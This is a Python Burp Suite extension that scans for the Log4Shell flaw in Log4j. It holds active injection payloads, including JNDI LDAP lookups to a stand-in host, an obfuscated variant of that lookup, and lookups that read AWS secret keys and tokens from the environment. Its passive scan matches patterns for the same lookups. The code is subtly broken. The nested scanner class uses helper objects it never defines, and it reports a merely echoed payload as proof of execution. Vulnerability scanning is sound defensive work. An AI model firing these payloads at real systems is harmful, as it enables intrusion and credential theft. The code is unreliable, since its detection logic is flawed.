from burp import IBurpExtender, IScannerCheck, IScanIssue
import re

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Enhanced CVE Checker")
        callbacks.registerScannerCheck(self.CVEScanner())

    class CVEScanner(IScannerCheck):
        def doPassiveScan(self, baseRequestResponse):
            issues = []
            request = baseRequestResponse.getRequest()
            response = baseRequestResponse.getResponse()
            if response:
                response_info = self._helpers.analyzeResponse(response)
                response_body = response.tostring()[response_info.getBodyOffset():]

                # Check for Log4Shell patterns
                log4shell_patterns = [
                    b'\${jndi:ldap://', b'\${jndi:rmi://', b'\${jndi:ldaps://',
                    b'\${jndi:dns://', b'\${jndi:iiop://', b'\${jndi:corba://',
                    b'\${jndi:nds://', b'\${jndi:nis://', b'\${jndi:rfc://'
                ]
                for pattern in log4shell_patterns:
                    if re.search(pattern, response_body):
                        issues.append(ScanIssue(
                            baseRequestResponse.getHttpService(),
                            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            [self._callbacks.applyMarkers(baseRequestResponse, None, [[response_info.getBodyOffset(), len(response_body)]])],
                            "Potential CVE-2021-44228 (Log4Shell) vulnerability detected",
                            "The response contains a JNDI lookup that might be vulnerable.",
                            "High"
                        ))

                # Check for other Log4j-related patterns
                log4j_patterns = [
                    b'\${sys:os.name}', b'\${env:}', b'\${sys:}', b'\${env:AWS_SECRET_ACCESS_KEY}',
                    b'\${java:version}', b'\${java:os}', b'\${env:AWS_SESSION_TOKEN}',
                    b'\${env:AWS_ACCESS_KEY_ID}', b'\${main:ARGS}'
                ]
                for pattern in log4j_patterns:
                    if re.search(pattern, response_body):
                        issues.append(ScanIssue(
                            baseRequestResponse.getHttpService(),
                            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            [self._callbacks.applyMarkers(baseRequestResponse, None, [[response_info.getBodyOffset(), len(response_body)]])],
                            "Potential Log4j vulnerability detected",
                            "The response contains a potentially vulnerable Log4j expression.",
                            "High"
                        ))
            return issues

        def doActiveScan(self, baseRequestResponse, insertionPoint):
            issues = []
            # Inject payloads into different parts of the request
            payloads = [
                '${jndi:ldap://example.com/a}', '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com/a}',
                '${sys:os.name}', '${env:AWS_SECRET_ACCESS_KEY}', '${java:version}'
            ]
            for payload in payloads:
                request = insertionPoint.buildRequest(payload.encode())
                response = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), request)
                response_info = self._helpers.analyzeResponse(response)
                response_body = response.tostring()[response_info.getBodyOffset():]
                
                # Check response for indications of payload execution
                if re.search(b'\${jndi:ldap://', response_body) or re.search(b'\${sys:os.name}', response_body):
                    issues.append(ScanIssue(
                        baseRequestResponse.getHttpService(),
                        self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                        [self._callbacks.applyMarkers(response, None, [[response_info.getBodyOffset(), len(response_body)]])],
                        "Potential Log4j exploit detected (Active Scan)",
                        "The response contains an expression that indicates payload execution.",
                        "High"
                    ))
            return issues

        def consolidateDuplicateIssues(self, existingIssue, newIssue):
            return existingIssue.getIssueDetail() == newIssue.getIssueDetail()

class ScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
